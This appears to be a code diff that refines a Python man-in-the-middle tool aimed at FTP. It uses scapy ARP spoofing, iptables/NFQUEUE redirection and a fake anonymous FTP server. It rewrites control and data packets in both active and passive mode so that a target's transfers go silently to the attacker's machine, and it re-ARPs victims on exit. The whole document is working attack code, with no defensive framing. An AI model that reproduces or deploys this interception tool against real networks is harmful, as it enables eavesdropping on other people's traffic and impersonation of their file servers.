@@ -1,26 +1,117 @@
-from netfilterqueue import NetfilterQueue
-from scapy.all import IP, TCP, send, ARP, Ether, srp
-import threading
 import re
+import signal
 import subprocess
-from ipaddress import ip_network
+import sys
+import threading
 import time
+from ipaddress import ip_network
+from multiprocessing import Event, Manager, Process
+
+from netfilterqueue import NetfilterQueue
 from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib.handlers import FTPHandler
 from pyftpdlib.servers import FTPServer
+from scapy.all import ARP, IP, TCP, Ether, send, srp
 
 # Configuration
 fake_ftp_ip = "192.168.2.128"
 gateway_ip = "192.168.2.1"
-ftp_ip = "192.168.1.200"
-target_ip = "192.168.2.129"
+ftp_ip = "192.168.2.200"
+target_ip = "192.168.2.130"
 interface_name = "ens33"
 
 # More configuration, that most likely won't need to be meddled
 fake_ftp_serve_directory = "/home/"
 fake_ftp_port = 2121
 ftp_port = 21
-ftp_data_port = {}
+netmask = 24
+
+# Global variables
+ftp_pasv_data_port = Manager().dict()
+ftp_active_data_port = Manager().dict()
+arp_mappings = Manager().dict()
+incoming_nfqueue = None
+outgoing_nfqueue = None
+STOP_EVENT = Event()  # Event to signal the end of the program
+arpspoof_procs = []
+
+
+def init_os_config():
+    """Boring admin things to handle before running the program"""
+    # ip_forward is enabled
+    subprocess.check_output(["sysctl", "-w", "net.ipv4.ip_forward=1"])
+
+    flush_iptable_rules()
+    # add iptables allow forwarding traffic
+    subprocess.check_output(
+        [
+            "iptables",
+            "-t",
+            "mangle",
+            "-A",
+            "FORWARD",
+            "-i",
+            interface_name,
+            "-j",
+            "TTL",
+            "--ttl-inc",
+            "1",
+        ]
+    )
+    subprocess.check_output(["iptables", "--policy", "FORWARD", "ACCEPT"])
+    subprocess.check_output(
+        [
+            "iptables",
+            "-t",
+            "mangle",
+            "-A",
+            "OUTPUT",
+            "-p",
+            "icmp",
+            "--icmp-type",
+            "5",
+            "-j",
+            "DROP",
+        ]
+    )
+
+    # iptables to route traffic to nfqueue
+    add_iptable_rules()
+
+
+def cleanup():
+    if incoming_nfqueue:
+        incoming_nfqueue.unbind()
+
+    if outgoing_nfqueue:
+        outgoing_nfqueue.unbind()
+
+    flush_iptable_rules()
+
+    STOP_EVENT.set()
+    print("Rearping targets")
+    for t in arpspoof_procs:
+        t.join()
+
+
+def sigint_handler(a, b):
+    cleanup()
+    sys.exit()
+
+
+def start_ftp_server():
+    """Starts the FTP server using pyftpd"""
+    authorizer = DummyAuthorizer()
+    authorizer.add_anonymous(fake_ftp_serve_directory)
+
+    handler = FTPHandler
+    handler.authorizer = authorizer
+    handler.banner = "(Sibei Secure FTPd 0.0.1)"
+
+    # listen on every IP on my machine on port 21
+    address = ("0.0.0.0", fake_ftp_port)
+    server = FTPServer(address, handler)
+    Process(target=server.serve_forever, daemon=True).start()
 
 
 def is_same_network(IP1, IP2):
@@ -34,24 +125,66 @@ def get_mac(ip):
     arp_request = ARP(pdst=ip)
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = srp(arp_request_broadcast, timeout=5,
-                        verbose=False, iface=interface_name)[0]
+    answered_list = srp(
+        arp_request_broadcast, timeout=5, verbose=False, iface=interface_name
+    )[0]
     if len(answered_list) > 0:
         return answered_list[0][1].hwsrc
 
     return None
 
 
-def start_arpspoof(target, spoof):
+def arpspoof_wrapper():
+    # Some logic to determine who to spoof
+    if is_same_network(f"{target_ip}/{netmask}", f"{ftp_ip}/{netmask}"):
+        t = Process(
+            target=start_arpspoof, args=(target_ip, ftp_ip, STOP_EVENT, arp_mappings)
+        )
+        arpspoof_procs.append(t)
+
+    t1 = Process(
+        target=start_arpspoof, args=(gateway_ip, target_ip, STOP_EVENT, arp_mappings)
+    )
+    t2 = Process(
+        target=start_arpspoof, args=(target_ip, gateway_ip, STOP_EVENT, arp_mappings)
+    )
+    arpspoof_procs.append(t1)
+    arpspoof_procs.append(t2)
+
+    for t in arpspoof_procs:
+        t.start()
+
+
+def start_arpspoof(target, spoof, event, arp_mappings):
     if target == spoof:
         return
 
-    target_mac = get_mac(target)
+    if not arp_mappings.get(target, None):
+        arp_mappings[target] = get_mac(target)
+
+    target_mac = arp_mappings[target]
+
     if not target_mac:
         return
 
-    while True:
-        packet = ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
+    while not event.is_set():
+        try:
+            packet = ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
+            send(packet, verbose=False)
+            time.sleep(1)
+        except KeyboardInterrupt:
+            continue
+
+    # REARP
+    actual_spoof_mac = arp_mappings.get(spoof, None)
+    if not actual_spoof_mac:
+        return
+
+    no_of_rearp_packets = 5
+    for i in range(no_of_rearp_packets):
+        packet = ARP(
+            op=2, pdst=target, hwdst=target_mac, psrc=spoof, hwsrc=actual_spoof_mac
+        )
         send(packet, verbose=False)
         time.sleep(1)
 
@@ -65,12 +198,16 @@ def add_iptable_rules():
             "mangle",
             "-A",
             "PREROUTING",
+            "-p",
+            "tcp",
             "-i",
             interface_name,
             "-j",
             "NFQUEUE",
             "--queue-num",
             "1",
+            "--destination",
+            ftp_ip,
         ]
     )
     subprocess.check_output(
@@ -83,28 +220,78 @@ def add_iptable_rules():
             "-o",
             interface_name,
             "-j",
+            "ACCEPT",
+            "--source",
+            fake_ftp_ip,
+            "-p",
+            "tcp",
+            "-m",
+            "multiport",
+            "--sports",
+            "8080",
+        ]
+    )
+    subprocess.check_output(
+        [
+            "iptables",
+            "-t",
+            "mangle",
+            "-A",
+            "POSTROUTING",
+            "-o",
+            interface_name,
+            "-j",
+            "ACCEPT",
+            "--source",
+            fake_ftp_ip,
+            "-p",
+            "tcp",
+            "-m",
+            "multiport",
+            "--dports",
+            "80,443",
+        ]
+    )
+    subprocess.check_output(
+        [
+            "iptables",
+            "-t",
+            "mangle",
+            "-A",
+            "POSTROUTING",
+            "-p",
+            "tcp",
+            "-o",
+            interface_name,
+            "-j",
             "NFQUEUE",
             "--queue-num",
             "2",
+            "--source",
+            fake_ftp_ip,
         ]
     )
 
 
 def flush_iptable_rules():
+    print("Flushing IPTable mangle table")
     subprocess.check_output(["iptables", "--table", "mangle", "--flush"])
 
 
 def to_intercept_incoming(pkt):
     """Conditions
     1. Destination port = FTP-Data or Real FTP Port
-    2. Destination IP = Real FTP IP"""
+    2. Destination IP = Real FTP IP
+    3. Source port = FTP-Data port"""
 
     # Preliminary filtering
     if IP not in pkt or TCP not in pkt:
         return False
 
     return pkt[IP].dst == ftp_ip and (
-        pkt[TCP].dport == ftp_port or pkt[TCP].dport in ftp_data_port
+        pkt[TCP].dport == ftp_port
+        or pkt[TCP].dport in ftp_pasv_data_port
+        or pkt[TCP].sport in ftp_active_data_port
     )
 
 
@@ -114,21 +301,28 @@ def incoming(packet):
     print("Raw incoming: ", pkt.summary())
 
     if not to_intercept_incoming(pkt):
-        if IP in pkt and pkt[IP].dst == fake_ftp_ip:
-            packet.accept()
-            return
         # "Forwards" the packet normally
-        send(pkt)
-        packet.drop()
+        if IP in pkt and pkt[IP].dst != fake_ftp_ip:
+            pkt[IP].ttl = pkt[IP].ttl + 1
+            pkt[IP].len = None
+            pkt[IP].chksum = None
+
+            packet.set_payload(bytes(pkt))
+        packet.accept()
         return
 
     # Guaranteed to have both TCP and IP in layer
+    process_incoming_ftp_packet(pkt)
     pkt[IP].dst = fake_ftp_ip
 
     if pkt[TCP].dport == ftp_port:
         pkt[TCP].dport = fake_ftp_port
     elif pkt[TCP].flags.F:
-        ftp_data_port[pkt[TCP].dport] = 1
+        if pkt[TCP].dport in ftp_pasv_data_port:
+            ftp_pasv_data_port[pkt[TCP].dport] = 1
+
+        if pkt[TCP].sport in ftp_active_data_port:
+            ftp_active_data_port[pkt[TCP].sport] = 1
 
     pkt[IP].len = None
     pkt[IP].chksum = None
@@ -137,6 +331,33 @@ def incoming(packet):
     print("Modified: ", pkt.summary())
     packet.set_payload(bytes(pkt))
     packet.accept()
+
+
+def calculate_ftp_port(port):
+    calculated_port = list(map(int, port.split(",")))
+    return calculated_port[0] * 256 + calculated_port[1]
+
+
+def process_incoming_ftp_packet(pkt):
+    """Modifies the ftp packet such that it points to the MiTM"""
+    if TCP not in pkt:
+        return
+
+    if not pkt[TCP].payload:
+        return
+
+    content = pkt[TCP].load.decode().strip()
+    # It just works
+    print(content)
+    regex = r"PORT [\d]{1,3},[\d]{1,3},[\d]{1,3},[\d]{1,3},([\d]{1,3},[\d]{1,3})"
+    result = re.match(regex, content)
+    if not result:
+        return
+
+    port = result.group(1)
+
+    calculated_port = calculate_ftp_port(port)
+    ftp_active_data_port[calculated_port] = 0
 
 
 def modify_ftp_packet(pkt):
@@ -159,8 +380,7 @@ def modify_ftp_packet(pkt):
 
     calculated_port = list(map(int, port.split(",")))
     calculated_port = calculated_port[0] * 256 + calculated_port[1]
-    ftp_data_port[calculated_port] = 0
-    print(ftp_data_port)
+    ftp_pasv_data_port[calculated_port] = 0
     content = f"227 Entering passive mode ({ip},{port})"
     pkt[TCP].remove_payload()
     pkt[TCP].add_payload(content)
@@ -169,14 +389,17 @@ def modify_ftp_packet(pkt):
 def to_intercept_outgoing(pkt):
     """Conditions
     1. Source port = FTP-Data or MITM FTP Port
-    2. Source IP = MITM FTP IP"""
+    2. Destination port = FTP-Data (active)
+    3. Source IP = MITM FTP IP"""
 
     # Preliminary filtering
     if IP not in pkt or TCP not in pkt:
         return False
 
     return pkt[IP].src == fake_ftp_ip and (
-        pkt[TCP].sport == fake_ftp_port or pkt[TCP].sport in ftp_data_port
+        pkt[TCP].sport == fake_ftp_port
+        or pkt[TCP].sport in ftp_pasv_data_port
+        or pkt[TCP].dport in ftp_active_data_port
     )
 
 
@@ -184,6 +407,8 @@ def outgoing(packet):
     """Intercepts all outgoing traffic handler"""
     pkt = IP(packet.get_payload())
     print("Outgoing: ", pkt.summary())
+    print(f"Active: {ftp_active_data_port}")
+    print(f"Passive: {ftp_pasv_data_port}")
 
     if not to_intercept_outgoing(pkt):
         packet.accept()
@@ -195,10 +420,11 @@ def outgoing(packet):
     if pkt[TCP].sport == fake_ftp_port:
         pkt[TCP].sport = ftp_port
         modify_ftp_packet(pkt)
-    elif ftp_data_port[pkt[TCP].sport]:
-        del ftp_data_port[pkt[TCP].sport]
+    elif ftp_pasv_data_port.get(pkt[TCP].sport, None):
+        del ftp_pasv_data_port[pkt[TCP].sport]
+    elif ftp_active_data_port.get(pkt[TCP].dport, None):
+        del ftp_active_data_port[pkt[TCP].dport]
 
-    print(ftp_data_port)
     pkt[IP].len = None
     pkt[IP].chksum = None
     pkt[TCP].chksum = None
@@ -209,50 +435,24 @@ def outgoing(packet):
 
 
 def main():
-    # Start ftp server
-    authorizer = DummyAuthorizer()
-    authorizer.add_anonymous(fake_ftp_serve_directory)
+    start_ftp_server()
 
-    handler = FTPHandler
-    handler.authorizer = authorizer
+    arpspoof_wrapper()
 
-    # listen on every IP on my machine on port 21
-    address = ("0.0.0.0", fake_ftp_port)
-    server = FTPServer(address, handler)
-    threading.Thread(target=server.serve_forever).start()
-
-    # Some logic to determine who to spoof
-    if is_same_network(f"{target_ip}/24", f"{ftp_ip}/24"):
-        threading.Thread(target=start_arpspoof,
-                         args=(target_ip, ftp_ip)).start()
-    threading.Thread(target=start_arpspoof, args=(
-        gateway_ip, target_ip)).start()
-    threading.Thread(target=start_arpspoof, args=(
-        target_ip, gateway_ip)).start()
-
-    # iptables for nfqueue
-    flush_iptable_rules()
-    add_iptable_rules()
+    init_os_config()
 
     # Netfilter Interception
-    nf1 = NetfilterQueue()
-    nf1.bind(1, incoming)
+    global incoming_nfqueue, outgoing_nfqueue
+    incoming_nfqueue = NetfilterQueue()
+    incoming_nfqueue.bind(1, incoming)
+    outgoing_nfqueue = NetfilterQueue()
+    outgoing_nfqueue.bind(2, outgoing)
 
-    nf2 = NetfilterQueue()
-    nf2.bind(2, outgoing)
-    try:
-        t1 = threading.Thread(target=nf1.run)
-        t2 = threading.Thread(target=nf2.run)
+    Process(target=incoming_nfqueue.run, daemon=True).start()
+    Process(target=outgoing_nfqueue.run, daemon=True).start()
 
-        t1.start()
-        t2.start()
-        t2.join()
-    except KeyboardInterrupt:
-        print("")
-
-    nf1.unbind()
-    nf2.unbind()
-    flush_iptable_rules()
+    signal.signal(signal.SIGINT, sigint_handler)
+    signal.pause()
 
 
 if __name__ == "__main__":
